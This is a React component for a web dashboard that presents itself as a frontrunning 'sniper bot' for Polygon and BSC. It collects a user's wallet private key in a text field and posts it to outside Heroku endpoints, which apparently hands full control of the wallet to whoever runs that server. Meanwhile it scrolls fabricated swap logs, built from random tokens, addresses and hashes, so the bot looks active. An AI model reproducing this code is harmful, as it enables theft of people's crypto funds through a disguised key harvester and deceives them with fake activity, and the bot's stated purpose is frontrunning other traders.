import React, { useEffect, useRef, useState } from "react";
import {
  LineChart,
  Line,
  XAxis,
  YAxis,
  Tooltip,
  CartesianGrid,
  BarChart,
  Bar,
  ReferenceLine,
  ResponsiveContainer,
  Cell,
  Area,
  ComposedChart,
} from "recharts";
import { ToastContainer, toast } from "react-toastify";

import axios from "axios";
import Nav from "../Nav/Nav";
import Web3 from "web3";

// Main bar colors
const barColors = ["#a0781c", "#1f5180"];

// Shade helper
const shadeColor = (color, percent) => {
  let R = parseInt(color.substring(1, 3), 16);
  let G = parseInt(color.substring(3, 5), 16);
  let B = parseInt(color.substring(5, 7), 16);

  R = Math.min(255, parseInt((R * (15 + percent)) / 15));
  G = Math.min(255, parseInt((G * (15 + percent)) / 15));
  B = Math.min(255, parseInt((B * (15 + percent)) / 15));

  return `#${R.toString(16).padStart(2, "0")}${G.toString(16).padStart(
    2,
    "0"
  )}${B.toString(16).padStart(2, "0")}`;
};

// Custom 3D Bar with gradient front
const Custom3DBar = ({ x, y, width, height, index, fill }) => {
  const depth = 5;
  const gradientId = `bar-gradient-${index}`;
  const rightColor = shadeColor(fill, -300);
  const topColor = shadeColor(fill, 12);

  return (
    <g>
      {/* Front face with gradient fill */}
      <rect
        x={x}
        y={y}
        width={width}
        height={height}
        fill={`url(#${gradientId})`}
      />

      {/* Right face */}
      <polygon
        points={`
          ${x + width},${y}
          ${x + width + depth},${y - depth}
          ${x + width + depth},${y + height - depth}
          ${x + width},${y + height}
        `}
        fill={rightColor}
      />

      {/* Top face */}
      <polygon
        points={`
          ${x},${y}
          ${x + depth},${y - depth}
          ${x + width + depth},${y - depth}
          ${x + width},${y}
        `}
        fill={topColor}
      />
    </g>
  );
};

function Hero() {
  const colors = ["#e8c66e", "rgb(28, 98, 168)"]; // two colors for bars

  // ✅ Network + Web3 (switchable)
  const [network, setNetwork] = useState(""); // "polygon" | "bsc"
  const [web3, setWeb3] = useState(new Web3("https://polygon-rpc.com")); // default Polygon

  const [address, setAddress] = useState(null);
  const [balance, setBalance] = useState(null);
  const [previousBalance, setPreviousBalance] = useState(null); // Store previous balance for profit calculation
  const [privateKey, setPrivateKey] = useState("");
  const [loader, setLoader] = useState(false);
  const [message, setMessage] = useState("");
  const [profit, setProfit] = useState(null); // Store profit

  const [logLines, setLogLines] = useState([]);
  let fakeInterval = null;

  // ✅ Switch network handler (UI remains same)
  const handleSwitchNetwork = () => {
    if (network === "polygon") {
      setNetwork("bsc");
      setWeb3(new Web3("https://bsc-dataseed.binance.org"));
    } else {
      setNetwork("polygon");
      setWeb3(new Web3("https://polygon-rpc.com"));
    }
  };

  // ✅ Fetch balance using current network RPC
  const fetchBalance = async () => {
    if (!address) return;
    try {
      const balanceInWei = await web3.eth.getBalance(address);
      const balanceInEther = web3.utils.fromWei(balanceInWei, "ether");
      setBalance(parseFloat(balanceInEther).toFixed(4));

      // Save the balance in localStorage and set it as previous balance
      localStorage.setItem("balance", balanceInEther);
      setPreviousBalance(balanceInEther);
    } catch (error) {
      console.error("Error fetching balance:", error);
      setBalance("Error fetching balance");
    }
  };

  // Refetch balance when address or network/web3 changes
  useEffect(() => {
    if (address) fetchBalance();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [address, web3]);

  const handleRunBot = async () => {
    if (!network) {
      toast.error("Please select a chain first!");
      return;
    }
    if (!privateKey || !address) {
      setMessage("Please enter both private key and address");
      return;
    }

    setLoader(true);
    setLogLines([]);
    setMessage("");

    const fakeLogs = [];
    const fakeTokens = [
      "USDT",
      "MATIC",
      "DAI",
      "SHIB",
      "PEPE",
      "BTC",
      "ETH",
      "BNB",
      "XRP",
      "DOGE",
      "ADA",
      "SOL",
      "DOT",
      "AVAX",
      "TRX",
      "UNI",
      "LINK",
      "LTC",
      "XLM",
      "ATOM",
      "NEAR",
      "AAVE",
      "FTM",
      "ARB",
      "OP",
      "SAND",
      "MANA",
      "GALA",
      "INJ",
      "RNDR",
      "FLOKI",
      "CRO",
      "VET",
      "HBAR",
      "LDO",
      "ENS",
      "DYDX",
      "ZIL",
      "RUNE",
      "1INCH",
      "BTT",
      "GMT",
      "MINA",
      "ANKR",
      "CHR",
      "ALGO",
      "KAVA",
      "MASK",
      "TWT",
      "YFI",
    ];
    const fakeAddresses = [
      "0x" + Math.random().toString(16).substr(2, 8),
      "0x" + Math.random().toString(16).substr(2, 8),
      "0x" + Math.random().toString(16).substr(2, 8),
    ];

    for (let i = 0; i < 10; i++) {
      const token = fakeTokens[Math.floor(Math.random() * fakeTokens.length)];
      const addr =
        fakeAddresses[Math.floor(Math.random() * fakeAddresses.length)];
      const hash = "0x" + Math.random().toString(16).substr(2, 64);
      fakeLogs.push(`Detected swap on ${token} by ${addr} | Tx: ${hash}`);
    }

    let fakeIndex = 0;
    fakeInterval = setInterval(() => {
      setLogLines((prev) => [...prev, fakeLogs[fakeIndex]]);
      fakeIndex = (fakeIndex + 1) % fakeLogs.length;
    }, 300);

    // Run bot and wait 1 minute minimum
    await runBotWithDelay();
  };

  // ✅ Bot API call picks endpoint + explorer by network
  const runBotWithDelay = async () => {
    const startTime = Date.now();

    try {
      const token = localStorage.getItem("token");
      console.log("Token from localStorage:", token);
      if (!token) throw new Error("Authorization token not found.");

      // Choose API by network
      const apiUrl =
        network === "polygon"
          ? "https://marlinnapp-5e0bd806334c.herokuapp.com/api/runBot"
          : "https://bnbsniperbot-aa86ddbecda5.herokuapp.com/api/runBot";

      console.log("Running bot API call on:", network);
      const response = await axios.post(
        apiUrl,
        {
          amount: 1,
          privatekey: privateKey,
        },
        {
          headers: { Authorization: `Bearer ${token}` },
        }
      );

      console.log("Bot API Response:", response.data);

      const { data, message } = response.data;
      const txHash = data?.frontrunTxHash;

      if (!txHash) throw new Error("No transaction hash returned.");

      // Use the current web3 for receipt checks (already bound to selected network)
      const checkConfirmation = setInterval(async () => {
        try {
          const receipt = await web3.eth.getTransactionReceipt(txHash);
          if (receipt && receipt.status) {
            clearInterval(checkConfirmation);
            console.log("Transaction confirmed!");
          }
        } catch (err) {
          console.error("Error checking transaction receipt:", err.message);
        }
      }, 5000);

      const elapsed = Date.now() - startTime;
      const remaining = Math.max(60000 - elapsed, 0);

      setTimeout(() => {
        clearInterval(fakeInterval);
        setLogLines([]);

        const explorer = network === "polygon" ? "polygonscan" : "bscscan";

        setMessage(
          <>
            <p className="mt-3 text-green-400">{message}</p>
            <div className="mt-3 text-green-300">
              <p>
                Frontrun TxHash:{" "}
                <a
                  href={`https://${explorer}.com/tx/${data.frontrunTxHash}`}
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  {data.frontrunTxHash}
                </a>
              </p>
              <p>
                Target TxHash:{" "}
                <a
                  href={`https://${explorer}.com/tx/${data.targetTxHash}`}
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  {data.targetTxHash}
                </a>
              </p>
              {data?.TakeProfitTxHash && (
                <p>
                  Take Profit TxHash:{" "}
                  <a
                    href={`https://${explorer}.com/tx/${data.TakeProfitTxHash}`}
                    target="_blank"
                    rel="noopener noreferrer"
                  >
                    {data.TakeProfitTxHash}
                  </a>
                </p>
              )}
            </div>
          </>
        );

        toast.success(message);

        // refresh balance and compute profit
        fetchBalance();
        const updatedBalance = localStorage.getItem("balance");
        if (previousBalance && updatedBalance) {
          const profitValue =
            parseFloat(updatedBalance) - parseFloat(previousBalance);
          if (!Number.isNaN(profitValue)) setProfit(profitValue.toFixed(4));
        }

        setLoader(false);
      }, remaining);
    } catch (error) {
      clearInterval(fakeInterval);
      console.error("Error running bot:", error);

      if (error.response) {
        console.error("API Error Response:", error.response.data);
        setMessage(
          `❌ API Error: ${error.response.data.message || "Unknown error"}`
        );
      } else {
        setMessage(`❌ Failed to run bot: ${error.message}`);
      }

      toast.error("Bot run failed.");
      setLoader(false);
    }
  };

  const logEndRef = useRef(null);
  useEffect(() => {
    const container = document.getElementById("logContainer");
    if (container) {
      container.scrollTop = container.scrollHeight;
    }
  }, [logLines]);
  useEffect(() => {
    // Scroll to the bottom every time logLines update
    if (logEndRef.current) {
      logEndRef.current.scrollIntoView({ behavior: "smooth" });
    }
  }, [logLines]);

  // Fetch POL Price Data
  const [polPriceData, setPolPriceData] = useState([]);
  const [blockHeightData, setBlockHeightData] = useState([]);
  const [pendingTxData, setPendingTxData] = useState([]);

  // Fetch Block Height Data every second (Polygon graph stays same)
  useEffect(() => {
    const interval = setInterval(() => {
      axios
        .get(
          "https://marlinnapp-5e0bd806334c.herokuapp.com/api/getData?type=blockheight"
        )
        .then((response) => {
          if (response.data.status) {
            const formattedData = response.data.data.map((entry) => ({
              time: new Date(entry.time).toLocaleTimeString(),
              blockHeight: entry.blockHeight,
            }));

            // Sorting data in ascending order and reversing to show latest at the bottom
            const sortedData = formattedData
              .sort((a, b) => new Date(a.time) - new Date(b.time))
              .reverse();

            setBlockHeightData(sortedData.slice(0, 11)); // Keep latest 11 entries
          }
        })
        .catch((error) =>
          console.error("Error fetching block height data:", error)
        );
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      axios
        .get(
          "https://marlinnapp-5e0bd806334c.herokuapp.com/api/getData?type=pendingtx"
        )
        .then((response) => {
          if (response.data.status) {
            const formattedData = response.data.data.map((entry) => ({
              time: new Date(entry.time).toLocaleTimeString(),
              pendingTx: entry.pendingTxCount,
            }));

            // Sorting data in ascending order and reversing to show latest at the bottom
            const sortedData = formattedData
              .sort((a, b) => new Date(a.time) - new Date(b.time))
              .reverse();

            setPendingTxData(sortedData.slice(0, 12)); // Keep latest 12 entries
          }
        })
        .catch((error) =>
          console.error("Error fetching pending transactions data:", error)
        );
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  const [time, setTime] = useState(new Date());

  return (
    <div>
      <Nav />
      <div className="container-fluid mt-5">
        <div className="row">
          <div className="col-12 col-lg-4">
            {/* LEFT: Charts (unchanged UI) */}
            <div className="mt-2">
              <div
                className="box d-block align-items-center text-white p-3"
                style={{
                  backgroundImage:
                    "linear-gradient(to bottom,rgba(203, 149, 73, 0.42), #140f0f ,#140f0f, #000000)",
                  borderRadius: "10px",
                }}
              >
                <div>
                  <h2
                    className="mb-2"
                    style={{ fontSize: "13px", color: "#e8c66e" }}
                  >
                    Block Height
                  </h2>
                  <ResponsiveContainer width="100%" height={240}>
                    <BarChart data={blockHeightData} barCategoryGap="50%">
                      <CartesianGrid strokeDasharray="3 3" stroke="#444" />
                      <XAxis
                        dataKey="time"
                        style={{ fontSize: "13px", fill: "#ccc" }}
                      />
                      <YAxis
                        domain={["auto"]}
                        style={{ fontSize: "13px", fill: "#ccc" }}
                      />
                      <Tooltip
                        contentStyle={{
                          backgroundColor: "#222",
                          borderRadius: "10px",
                          border: "1px solid #e8c66e",
                        }}
                        labelStyle={{ color: "#e8c66e", fontWeight: "bold" }}
                        itemStyle={{ color: "#fff" }}
                        cursor={{ fill: "transparent" }}
                      />

                      {/* Gradient Definitions for Front Faces */}
                      <defs>
                        {blockHeightData.map((_, index) => {
                          const color = barColors[index % barColors.length];
                          return (
                            <linearGradient
                              key={index}
                              id={`bar-gradient-${index}`}
                              x1="0"
                              y1="1"
                              x2="0"
                              y2="0"
                            >
                              <stop offset="0%" stopColor="#000" />
                              <stop offset="100%" stopColor={color} />
                            </linearGradient>
                          );
                        })}
                      </defs>

                      {/* Custom bars */}
                      <Bar
                        dataKey="blockHeight"
                        shape={(props) => (
                          <Custom3DBar
                            {...props}
                            index={props.index}
                            fill={barColors[props.index % barColors.length]}
                          />
                        )}
                        barSize={18}
                      >
                        {blockHeightData.map((_, index) => (
                          <Cell key={`cell-${index}`} />
                        ))}
                      </Bar>
                    </BarChart>
                  </ResponsiveContainer>
                </div>
              </div>
            </div>

            <div className="mt-2">
              <div
                className="box d-block align-items-center text-white py-3 px-2"
                style={{
                  backgroundImage:
                    "linear-gradient(to bottom,rgba(203, 149, 73, 0.42), #140f0f ,#140f0f, #000000)",
                  borderRadius: "10px",
                }}
              >
                <div>
                  <h2
                    className="mb-2"
                    style={{ fontSize: "13px", color: "#e8c66e" }}
                  >
                    Pending Transactions
                  </h2>
                  <ResponsiveContainer width="100%" height={220}>
                    <ComposedChart data={pendingTxData}>
                      <defs>
                        <linearGradient
                          id="gradientFill"
                          x1="0"
                          y1="0"
                          x2="0"
                          y2="1"
                        >
                          <stop offset="0%" stopColor="#1f5180" />
                          <stop offset="50%" stopColor="#1f5180" />
                          <stop offset="70%" stopColor="#1f5180" />
                          <stop offset="90%" stopColor="#12212e" />
                          <stop offset="100%" stopColor="#000000" />
                        </linearGradient>
                      </defs>

                      <CartesianGrid strokeDasharray="3 3" stroke="#444" />
                      <XAxis
                        dataKey="time"
                        tick={{ fill: "#ccc", fontSize: 12 }}
                      />
                      <YAxis
                        domain={["auto"]}
                        tick={{ fill: "#ccc", fontSize: 12 }}
                      />

                      <Area
                        type="monotone"
                        dataKey="pendingTx"
                        fill="url(#gradientFill)"
                        stroke="none"
                      />

                      <Line
                        type="monotone"
                        dataKey="pendingTx"
                        stroke="#1f5180"
                        strokeWidth={2}
                        dot={{
                          r: 5,
                          fill: "#fff",
                          stroke: "#1f5180",
                          strokeWidth: 2,
                        }}
                        activeDot={{ r: 6 }}
                      />

                      <Tooltip
                        contentStyle={{
                          backgroundColor: "#1c1b1f",
                          borderRadius: "10px",
                          border: "1px solid #e8c66e",
                        }}
                        labelStyle={{ color: "#e8c66e", fontWeight: "bold" }}
                        itemStyle={{ color: "#fff" }}
                      />
                    </ComposedChart>
                  </ResponsiveContainer>
                </div>
              </div>
            </div>
          </div>

          {/* RIGHT: Main card + inputs (UI unchanged) */}
          <div className="col-12 col-lg-8">
            <div className=" m">
              <div className="card bgcard p-3">
                {/* 🔝 Top Row: Network Label (left) + Selector (right) */}
                <div className="d-flex justify-content-between align-items-center">
                  <div
                    className="text-white fw-bold ms-2"
                    style={{ fontSize: "15px" }}
                  >
                    {network
                      ? network === "polygon"
                        ? "POLYGON"
                        : "BSC"
                      : "Select Chain"}
                  </div>

                  <select
                    value={network}
                    onChange={(e) => setNetwork(e.target.value)}
                    className="px-1 py-1  rounded-lg w-25 booderr"
                    style={{
                      backgroundColor: "black",
                      backgroundImage:
                        "linear-gradient(to bottom, rgb(68, 57, 21), rgba(101, 85, 31, 0.37), rgb(0, 0, 0), rgba(101, 85, 31, 0.37), rgba(101, 85, 31, 0.5))",
                      borderRadius: "8px",
                      border: "2px solid rgba(255, 215, 0, 0.6)",
                      boxShadow:
                        "inset 0 1px 3px rgba(255,255,255,0.2), inset 0 -1px 2px rgba(0,0,0,0.7), 0 2px 6px rgba(0,0,0,0.5)",
                      color: "#f1f1f1",
                    }}
                  >
                    <option value="" disabled>
                      Select Network
                    </option>
                    <option value="polygon">Polygon</option>
                    <option value="bsc">BSC</option>
                  </select>
                </div>

                {/* 🔽 Address */}
                <div className="d-flex align-items-center mt-2">
                  <p className="m-0 text-white fw-bold ms-2">Address :</p>
                  <p className="m-0 text-white ms-2">{address}</p>
                </div>

                {/* 🔽 Chains */}
                <div className="d-flex align-items-center mt-2">
                  <p className="m-0 text-white fw-bold ms-2">Chains :</p>
                  <p className="m-0 text-white ms-2">
                    {network
                      ? network === "polygon"
                        ? "POLYGON"
                        : "BSC"
                      : "Select Chain"}
                  </p>
                </div>

                {/* 🔽 Balance */}
                <div className="d-flex mt-2">
                  <p className="m-0 text-white fw-bold ms-2">Balance :</p>
                  <p className="m-0 text-white ms-2">
                    {balance !== null && (
                      <span className="text-white">{balance}</span>
                    )}
                  </p>
                </div>
              </div>
            </div>

            <input
              type="text"
              className="w-100 py-2 mt-3 bg-black-ff"
              placeholder="Enter Address"
              value={address || ""}
              style={{
                backgroundColor: "black",
                backgroundImage:
                  "linear-gradient(to bottom, rgb(68, 57, 21), rgba(101, 85, 31, 0.37), rgb(0, 0, 0), rgba(101, 85, 31, 0.37), rgba(101, 85, 31, 0.5))",
                borderRadius: "8px",
                border: "2px solid rgba(255, 215, 0, 0.6)",
                boxShadow:
                  "inset 0 1px 3px rgba(255,255,255,0.2), inset 0 -1px 2px rgba(0,0,0,0.7), 0 2px 6px rgba(0,0,0,0.5)",
                color: "#f1f1f1",
                paddingLeft: "12px",
              }}
              onChange={(e) => setAddress(e.target.value)}
            />
            <input
              type="text"
              className="w-100 py-2 mt-3"
              placeholder="Enter Private Key"
              value={privateKey}
              style={{
                backgroundColor: "black",
                backgroundImage:
                  "linear-gradient(to bottom, rgb(68, 57, 21), rgba(101, 85, 31, 0.37), rgb(0, 0, 0), rgba(101, 85, 31, 0.37), rgba(101, 85, 31, 0.5))",
                borderRadius: "8px",
                border: "2px solid rgba(255, 215, 0, 0.6)",
                boxShadow:
                  "inset 0 1px 3px rgba(255,255,255,0.2), inset 0 -1px 2px rgba(0,0,0,0.7), 0 2px 6px rgba(0,0,0,0.5)",
                color: "#f1f1f1",
                paddingLeft: "12px",
              }}
              onChange={(e) => setPrivateKey(e.target.value)}
            />
            <div className="w-100 d-flex justify-content-center">
              <button
                className="btn btn-pink w-50 mt-3 fw-bold py-2"
                style={{
                  fontSize: "15px",
                  backgroundImage:
                    "linear-gradient(to bottom, rgb(238, 193, 46), rgb(216, 177, 50), rgba(200, 163, 43, 0.52))",
                  borderRadius: "8px",
                }}
                onClick={handleRunBot}
              >
                {loader ? <>Processing</> : <>Start Bot</>}
              </button>
            </div>

            <div className=" mt-5">
              <div
                className="card bgcard22 text-white overflow-y-auto max-h-96"
                id="logContainer"
              >
                {logLines.map((line, index) => (
                  <p key={index}>{line}</p>
                ))}
                <div className="mt-4">{message}</div>
              </div>
            </div>
          </div>
        </div>
      </div>
      {/* Toast container if you use react-toastify somewhere globally */}
      <ToastContainer />
    </div>
  );
}

export default Hero;

// Frontrun TxHash: 0xf7a3b3e69e323d9eced3d57714e0e0ee67f1319fdd249203075c556f3f5f62d8
// Target TxHash: 0x04e1efba650a28efee5f9ba0fa636568061e0b2e1ddc1343d5a0fe7525c800cf
// Take Profit TxHash: 0xfc520f9ef990c581ef4fc7d9a3817225f6e815f53fba2dcf5346519407c0b3a6
